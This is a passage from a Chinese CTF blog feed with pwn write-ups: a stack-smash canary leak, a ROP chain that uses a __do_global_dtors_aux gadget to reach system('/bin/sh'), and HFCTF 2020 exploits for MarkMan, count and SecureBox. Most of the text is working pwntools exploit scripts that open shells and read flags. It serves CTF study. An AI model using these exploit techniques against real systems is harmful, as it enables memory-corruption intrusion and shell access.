class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'stack smashing detected ***: '</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'stack_addr = '</span> + hex(stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input("leak flag")</span></span><br><span class="line">payload2 = <span class="string">'A'</span> * <span class="number">0x128</span> + p64(stack_addr - <span class="number">0x168</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please type your guessing flag'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">'&#125;'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>References:</p><p><a href="http://0x4c43.cn/2018/1013/stack-overflow-smash-utilization/" target="_blank" rel="noopener">栈溢出 Stack smash 利用</a></p><p><a href="https://www.anquanke.com/post/id/161142#h2-0" target="_blank" rel="noopener">浅析ROP之Stack Smash</a></p><p> <a href="http://tacxingxing.com/2017/12/16/environ/" target="_blank" rel="noopener">Environ</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在 Linux 系统应用程序中部署 Canary 漏洞缓解机制可有效防御栈溢出漏洞的攻击，然而在一定环境下，攻击者可利用该机制泄露内存信息，实现进一步的攻击。&lt;/p&gt;
&lt;h1 id=&quot;利用思路&quot;&gt;&lt;a href=&quot;#利用思路&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>__do_global_dtors_aux的gadget</title>
    <link href="https://nocbtm.github.io/2020/04/21/%C2%96do-global-dtors-aux%E7%9A%84gadget/"/>
    <id>https://nocbtm.github.io/2020/04/21/do-global-dtors-aux的gadget/</id>
    <published>2020-04-21T03:30:39.000Z</published>
    <updated>2020-04-28T16:49:57.831Z</updated>
    
    <content type="html"><![CDATA[<p>_do_global_dtors_aux中有一个gadgets可以修改stack上的数据，以达到可以代替64位的<code>ret2_dl_runtime_resolve</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@--name:/ctf/work/eonew/noleak<span class="comment"># ROPgadget --binary no_leak | grep rbp</span></span><br><span class="line">0x00000000004004b6 : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004004b5 : add byte ptr [rax], r8b ; pop rbp ; ret</span><br><span class="line">0x0000000000400517 : add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class="line">0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span><br><span class="line">0x00000000004004a9 : je 0x4004c0 ; pop rbp ; mov edi, 0x601010 ; jmp rax</span><br><span class="line">0x00000000004004eb : je 0x400500 ; pop rbp ; mov edi, 0x601010 ; jmp rax</span><br><span class="line">0x0000000000400512 : mov byte ptr [rip + 0x200af7], 1 ; pop rbp ; ret</span><br><span class="line">0x00000000004004b3 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class="line">0x00000000004004f5 : nop dword ptr [rax] ; pop rbp ; ret</span><br><span class="line">0x0000000000400515 : or ah, byte ptr [rax] ; add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class="line">0x00000000004004ab : pop rbp ; mov edi, 0x601010 ; jmp rax</span><br><span class="line">0x00000000004005cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005cf : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004004b8 : pop rbp ; ret</span><br></pre></td></tr></table></figure><p><code>0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</code> 这个gadget位于</p><p>_do_global_dtors_aux中 只要控制rbp和edx的值就可以任意修改栈上的数据</p><h2 id="no-leak"><a href="#no-leak" class="headerlink" title="no_leak"></a>no_leak</h2><p>栈溢出，没有可泄露的函数，第一感觉是用<code>ret2_dl_runtime_resolve</code>,但尝试之后发现这道题在伪造调用<code>dl_runtime_resolve</code>的时候会跳转到一个未知的地方，而且溢出的字节有点少。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用思路如下:</p><p>1、栈迁移到bss上</p><p>2、调用libc_start_main，使得bss上残留下原本栈的信息，就会有真实地址在bss上分布</p><p>3、找一个能用的真实地址，利用神奇的gadget，把它伪造成system，再次回跳到main函数</p><p>4、栈溢出构造<code>system(&#39;/bin/sh&#39;)</code></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"no_leak"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">'nc.eonew.cn'</span>, <span class="number">10002</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cus_rop</span><span class="params">(gadget1,gadget2,func_got,rdi,rsi,rdx)</span>:</span></span><br><span class="line">    payload = p64(gadget1)</span><br><span class="line">    payload += p64(<span class="number">0</span>) </span><br><span class="line">    payload += p64(<span class="number">0</span>)         <span class="comment">#rbx=0</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)         <span class="comment">#rbp=1</span></span><br><span class="line">    payload += p64(func_got)  <span class="comment">#r12  call</span></span><br><span class="line">    payload += p64(rdi)       <span class="comment">#r13  rdx </span></span><br><span class="line">    payload += p64(rsi)       <span class="comment">#r14  rsi</span></span><br><span class="line">    payload += p64(rdx)       <span class="comment">#r15  edi </span></span><br><span class="line">    payload += p64(gadget2)</span><br><span class="line">    payload += <span class="string">'\x00'</span>*<span class="number">56</span>      <span class="comment">#tiao zheng zhan zhen</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line">gadget_reg = <span class="number">0x4005C6</span> </span><br><span class="line">gadget_call= <span class="number">0x4005B0</span></span><br><span class="line">magic_gadget = <span class="number">0x400518</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005D3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4005D1</span></span><br><span class="line">leave_ret = <span class="number">0x400564</span></span><br><span class="line">buf_address = elf.bss() + <span class="number">0x500</span></span><br><span class="line">fini = <span class="number">0x4005E0</span></span><br><span class="line">init = <span class="number">0x400570</span></span><br><span class="line">start = <span class="number">0x400450</span></span><br><span class="line"><span class="comment">#---------------</span></span><br><span class="line">dbg(<span class="number">0x400537</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">'\x00'</span>*<span class="number">0x80</span> + p64(buf_address)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(buf_address) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">8</span></span><br><span class="line">payload += cus_rop(gadget_reg,gadget_call,elf.got[<span class="string">'__libc_start_main'</span>],start,fini,init)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#--------------- </span></span><br><span class="line">pause()</span><br><span class="line">payload  = <span class="string">'\x00'</span>*<span class="number">0x80</span> + p64(buf_address)</span><br><span class="line">payload += p64(<span class="number">0x4005Ca</span>)</span><br><span class="line">payload += p64(<span class="number">0xFFFFFFFFFFC5EE18</span>) <span class="comment">##(-0x3a11e8)^0xffffffffffffffff+1</span></span><br><span class="line">payload += p64(<span class="number">0x601458</span>+<span class="number">0x3d</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(magic_gadget)</span><br><span class="line">payload += p64(start)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#--------------- </span></span><br><span class="line">binsh = <span class="number">0x6012b0</span></span><br><span class="line">system = <span class="number">0x601458</span></span><br><span class="line">payload =<span class="string">'/bin/sh\x00'</span>+<span class="string">'b'</span>*<span class="number">0x80</span></span><br><span class="line">payload +=cus_rop(gadget_reg,gadget_call,system,binsh,fini,init)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>修改<code>0x601458</code>处的地址，经过加减得到<code>__libc_system</code></p><p><img alt="" data-src="https://nocbtm.github.io/imgs/aux-1.png" class="lozad"></p><p><img alt="" data-src="https://nocbtm.github.io/imgs/aux-2.png" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;_do_global_dtors_aux中有一个gadgets可以修改stack上的数据，以达到可以代替64位的&lt;code&gt;ret2_dl_runtime_resolve&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;t
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HFCTF pwn witeup</title>
    <link href="https://nocbtm.github.io/2020/04/20/HFCTF-pwn-witeup/"/>
    <id>https://nocbtm.github.io/2020/04/20/HFCTF-pwn-witeup/</id>
    <published>2020-04-20T01:31:03.000Z</published>
    <updated>2020-04-24T02:13:47.864Z</updated>
    
    <content type="html"><![CDATA[<p>虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题</p><h2 id="MarkMan"><a href="#MarkMan" class="headerlink" title="MarkMan"></a>MarkMan</h2><p>这个题耗费了太多时间，程序给了puts函数地址,存在一个任意地址写三字节，任意地址尝试了很多地方，刚开始想往stack上写未果，又往<code>dlopen</code>的<code>_dlfcn_hook</code> 上写未果，最终在exit函数会调用<code>_rtld_global</code>结构中的<code>_dl_rtld_lock_recursive</code>或者<code>_dl_rtld_unlock_recursive</code>处改写成功 ，并且因为<code>_dl_rtld_lock_recursive</code>指向的内容距离 <code>libc.address</code>过大，修改后三字节只会有几率成功</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level   = 'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p = process(<span class="string">'./chall'</span>)</span><br><span class="line"><span class="comment">#p=remote('39.97.210.182',10055)</span></span><br><span class="line">elf=ELF(<span class="string">'./chall'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">libc=ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *$rebase(0xcbc)\nb *$rebase(0xcc1)\nb *$rebase(0xd63)\n")</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"target near: 0x"</span>)</span><br><span class="line">leak=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc.address = leak - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">success(<span class="string">'leak =&gt; &#123;0&#125;'</span>.format(hex(leak)))</span><br><span class="line">success(<span class="string">'libc_address =&gt; &#123;0&#125;'</span>.format(hex(libc.address)))</span><br><span class="line"></span><br><span class="line">dlfcn_hook=libc.address+(<span class="number">0x15555532d0a0</span><span class="number">-0x155554d60000</span>)</span><br><span class="line">dl_rtld_lock_recursive=libc.address+(<span class="number">0x7f8a645fbf60</span><span class="number">-0x7f8a63dde000</span>)</span><br><span class="line">success(<span class="string">'dl_rtld_lock_recursive =&gt; &#123;0&#125;'</span>.format(hex(dl_rtld_lock_recursive)))</span><br><span class="line">success(<span class="string">'dlfcn_hook =&gt; &#123;0&#125;'</span>.format(hex(dlfcn_hook)))</span><br><span class="line">p.sendline(str(int(dl_rtld_lock_recursive)))</span><br><span class="line"></span><br><span class="line">payload=libc.address+one[<span class="number">1</span>]</span><br><span class="line">info(hex(payload))</span><br><span class="line">yi=payload&amp;<span class="number">0xff</span></span><br><span class="line">er=(payload&amp;<span class="number">0xffff</span>)&gt;&gt;<span class="number">8</span></span><br><span class="line">san=(payload&amp;<span class="number">0xffffff</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line">info(hex(yi))</span><br><span class="line">info(hex(er))</span><br><span class="line">info(hex(san))</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(yi))</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(er))</span><br><span class="line">p.recvuntil(<span class="string">'biang!\n'</span>)</span><br><span class="line">p.sendline(p8(san))</span><br><span class="line">p.sendline(<span class="string">"cat flag*"</span>)</span><br><span class="line">con=p.recv()</span><br><span class="line"><span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> con:</span><br><span class="line"><span class="keyword">print</span> con</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="count"><a href="#count" class="headerlink" title="count"></a>count</h2><p><code>arm aarch64</code>架构的题,搭建好qemu环境即可调试,题目很简单,不需要本地调试,直接利用IDA F5查看伪C代码即可写EXP<br>200次输入正确结果,利用python里面的eval函数即可自动计算结果,然后通过覆盖目标变量的值即可getshell</p><p>本地运行需要安装所需要的库 ,搜索aarch64的交叉编译的库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  sudo apt-cache search aarch64</span><br><span class="line">cpp-5-aarch64-linux-gnu - GNU C preprocessor</span><br><span class="line">cpp-aarch64-linux-gnu - GNU C preprocessor (cpp) <span class="keyword">for</span> the arm64 architecture</span><br><span class="line">g++-5-aarch64-linux-gnu - GNU C++ 编译器</span><br><span class="line">g++-aarch64-linux-gnu - GNU C++ compiler <span class="keyword">for</span> the arm64 architecture</span><br><span class="line">gcc-5-aarch64-linux-gnu - GNU C 编译器</span><br><span class="line">gcc-5-aarch64-linux-gnu-base - GCC, the GNU Compiler Collection (base package)</span><br><span class="line">gcc-aarch64-linux-gnu - GNU C compiler <span class="keyword">for</span> the arm64 architecture</span><br><span class="line">binutils-aarch64-linux-gnu - GNU binary utilities, <span class="keyword">for</span> aarch64-linux-gnu target</span><br><span class="line">qemu-system-arm - QEMU full system emulation binaries (arm)</span><br></pre></td></tr></table></figure><p>安装所需要的库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-5-aarch64-linux-gnu gcc-aarch64-linux-gnu</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"r"</span>:</span><br><span class="line">    p = remote(<span class="string">'39.97.210.182'</span>,<span class="string">'40285'</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu"</span>, <span class="string">"pwn"</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu"</span>, <span class="string">"pwn"</span>])</span><br><span class="line">    <span class="comment">#os.system("gdb -q -ex 'target remote localhost:1234' ")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>) :</span><br><span class="line">p. recvuntil(<span class="string">"~Math: "</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">" = "</span>)[:<span class="number">-3</span>]</span><br><span class="line">answer = eval(data)</span><br><span class="line">p. sendline(str(answer))</span><br><span class="line">payload= <span class="string">'a'</span>*<span class="number">0x64</span>+p64(<span class="number">0x12235612</span>)</span><br><span class="line">p. sendline(payload)</span><br><span class="line">p. interactive()</span><br></pre></td></tr></table></figure><h2 id="SecureBox"><a href="#SecureBox" class="headerlink" title="SecureBox"></a>SecureBox</h2><p>申请空间的函数,在判断size是否大于0xFFF的时候变量强制转化成了int类型,则有整型溢出,又当申请一个很大的空间的时候,由于空间肯定不够,最终不会申请,对应的指针位置为0,则此刻有了一个超大的size,以及指针以0为初始位置,即可实现任意写,最后将接受到的key值逆序与需要写的内容异或,通过enc函数则可往目标地址写上所需写的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LD <span class="keyword">import</span>*</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,sign = <span class="number">0</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Size: '</span>,str(size))</span><br><span class="line">    <span class="keyword">if</span> sign:</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">    p.recvuntil(<span class="string">'Key: \n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'ID: '</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(idx,off,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'ID: '</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'Offset of msg: '</span>,str(off))</span><br><span class="line">    p.sendlineafter(<span class="string">'Len of msg: '</span>,<span class="string">'16'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'Msg: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Exit'</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Box ID: '</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'Offset of msg: '</span>,<span class="string">'0'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Len of msg: '</span>,<span class="string">'8'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Msg: \n'</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.30.so'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">context.log_level =<span class="string">'DEBUG'</span></span><br><span 